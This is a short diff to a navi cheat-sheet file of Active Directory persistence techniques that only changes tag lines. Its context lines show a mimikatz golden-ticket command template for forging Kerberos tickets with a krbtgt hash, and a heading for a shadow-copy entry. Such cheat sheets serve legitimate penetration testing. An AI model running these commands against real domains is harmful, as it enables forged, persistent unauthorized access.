@@ -1,5 +1,5 @@
 % sealldev, persistence, golden ticket, active directory, mimikatz
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 ; Create our own TGTs with fake permissions for any user on the domain
@@ -14,7 +14,7 @@ kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<KR
 misc::cmd
 
 % sealldev, persistence, shadow copies, active directory, vshadow
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 
